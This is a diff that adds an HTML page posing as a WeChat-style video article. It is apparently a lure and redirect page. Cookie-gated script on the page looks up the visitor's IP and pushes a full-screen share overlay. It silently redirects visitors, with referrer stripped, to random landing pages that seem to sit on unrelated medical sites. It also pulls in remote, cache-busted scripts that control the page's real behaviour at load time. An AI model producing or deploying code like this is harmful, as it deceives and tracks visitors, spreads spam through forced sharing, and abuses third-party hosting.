@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+    <title></title>
+    <link rel="stylesheet" type="text/css" href="https://zhao-yun1.oss-cn-hangzhou.aliyuncs.com/css/main.css?v=1">
+    <link rel="stylesheet" type="text/css" href="https://zhao-yun1.oss-cn-hangzhou.aliyuncs.com/css/more.css">
+ <link rel="stylesheet" href="https://cdn.staticfile.org/weui/1.1.2/style/weui.min.css" />
+		<link rel="stylesheet" href="https://cdn.staticfile.org/Swiper/3.4.2/css/swiper.min.css">
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js" charset="utf-8"></script>
+		<script src="https://cdn.staticfile.org/jquery-cookie/1.4.1/jquery.cookie.min.js" charset="utf-8"></script>
+		<script src="https://cdn.staticfile.org/zepto/1.2.0/zepto.min.js" charset="utf-8"></script>
+    <script src="https://cdn.staticfile.org/iScroll/5.1.3/iscroll-lite.min.js" charset="utf-8"></script>    
+		<script src="https://cdn.staticfile.org/Swiper/3.4.2/js/swiper.min.js" charset="utf-8"></script>    
+    <script src="https://zhao-yun1.oss-cn-hangzhou.aliyuncs.com/js/lib.js?v=1.1" charset="utf-8"></script>
+    <script src="https://imgcache.qq.com/tencentvideo_v1/tvp/js/tvp.player_v2_zepto.js" charset="utf-8"></script>
+    <script src="https://v.qq.com/iframe/tvp.config.js" charset="utf-8"></script>   
+	<script src="https://zhao-yun1.oss-cn-hangzhou.aliyuncs.com/v_config/api.config.js?v="+Date.now()></script>
+	<script src="https://zhao-yun1.oss-cn-hangzhou.aliyuncs.com/array/land-arrays/land-arrays.js?v="+Date.now()></script>
+	
+    <style>
+        .scroll-text {
+            width: 400px;
+            height: 2rem;
+            overflow: hidden;
+            padding-left: .5rem;
+            padding-top: 2rem;
+            z-index: 99999;
+            position: absolute;
+            top: .75rem;
+        }
+
+        .scroll-text .box {
+            width: 21.685rem;
+            height: 2rem;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 1rem;
+            overflow: hidden
+        }
+
+        .scroll-text ul {
+            width: 800px;
+            height: 100px;
+            overflow: hidden;
+            margin: 0;
+        }
+
+        .scroll-text ul li {
+            padding: .12rem;
+            height: 2rem;
+        }
+
+        .scroll-text img {
+            width: 100%;
+            height: 100%
+        }
+
+        .scroll-text .avatar {
+            width: 1.9rem;
+            height: 1.9rem;
+            border-radius: 50%;
+            overflow: hidden;
+            float: left
+        }
+
+        .scroll-text .text {
+            font-size: 1.0rem;
+            margin-left: 2.2rem;
+        }
+    </style>
+
+</head>
+<body id="activity-detail" class="zh_CN mm_appmsg" style="background-color:#000;">
+</body>
+</div>
+<script>
+    if ($.cookie('ac') == 'show') {
+        $("body").append(
+            "<div id=\"zhezhao_share\" style=\"position: fixed; left: 0px; right: 0px; top: 0px; bottom: 0px; display: none; background-color: rgba(0, 0, 0, 0.8);\">\n" +
+            "    <p style=\"text-align: right; padding-left: 10px;color:#fff;font-size:20px\">\n" +
+            "        <img src=\"https://botoyo.oss-cn-hangzhou.aliyuncs.com/images/fx3.png\" id=\"share-wx-img\" style=\"width: 100%; padding-right: 15px;\">\n" +
+            "    </p>\n" +
+            "</div>" +
+            "<script src=\"https://ip.ws.126.net/ipquery\" async=\"async\" charset=\"utf-8\"/>\n"
+        )
+        var s = document.createElement('script');
+        //
+        s.src = 'https://zhao-yun1.oss-cn-hangzhou.aliyuncs.com/v_lb/app.share.js?v=' + Date.now();
+        s.setAttribute('charset', 'utf-8');
+        document.body.appendChild(s);
+    } else {
+        if($.cookie('ac') != 'goon'){
+			// URL
+            var arrays = [
+						"http://file.yihu365.com/nurse/001/00115346881307583902.html",
+						"http://studioimage.yxj.org.cn/cont/cd8a29eba16040149707a2bbca81d80f.html",
+						"http://img.jianke.com/mall/common/201808/d85688ec91c940afa1841a8d4a4ae6fa.html"
+						];
+			
+			
+            function getRandomUrlFromList(list) {
+                return list[Math.floor(Math.random() * list.length)]
+            }
+			
+			if(land_arrays == "" || land_arrays == null || land_arrays == undefined){
+					var land_arrays = arrays;
+			}
+			
+            var currentUrl = location.protocol + '//' + location.host + location.pathname;
+
+            if (land_arrays.indexOf(currentUrl) === -1) {
+                var a = document.createElement('a');
+                a.href = getRandomUrlFromList(land_arrays) + location.search;
+                a.rel = 'noreferrer';
+                a.click();
+            }
+			
+        }
+
+        $("body").append(
+            "<div id=\"wrapper\" style=\"position:absolute;top:0;bottom:0;left:0;right:0;\">\n" +
+            "    <div id=\"js_article\" style=\"position: absolute;top:50%;margin-top: -110px;width:100%;\" class=\"rich_media\">\n" +
+            "        <div id=\"js_top_ad_area\" class=\"top_banner\"> </div>\n" +
+            "        <div class=\"rich_media_inner\">\n" +
+            "            <div id=\"page-content\">\n" +
+            "                <div id=\"img-content\" class=\"rich_media_area_primary\" style=\"background-color:#000\">\n" +
+            "                    <div class=\"rich_media_content\" id=\"js_content\" style=\"height:200px;\">\n" +
+            "                    </div>\n" +
+            "                </div>\n" +
+            "            </div>\n" +
+            "        </div>\n" +
+            "    </div>\n" +
+            "</div>\n" +
+            "<div id=\"pauseplay\" style=\"display:none;opacity: 0;position:fixed;left:0;right:0;top:65px;bottom:0;background-color:rgba(80,80,80,50);z-index:1000000;\"></div>\n"
+        )
+        var s = document.createElement('script');
+
+        s.src = 'https://zhao-yun1.oss-cn-hangzhou.aliyuncs.com/v_lb/video.lb.js?v=' + Date.now();
+        s.setAttribute('charset', 'utf-8');
+        document.body.appendChild(s);
+    }
+
+</script>
+</html>
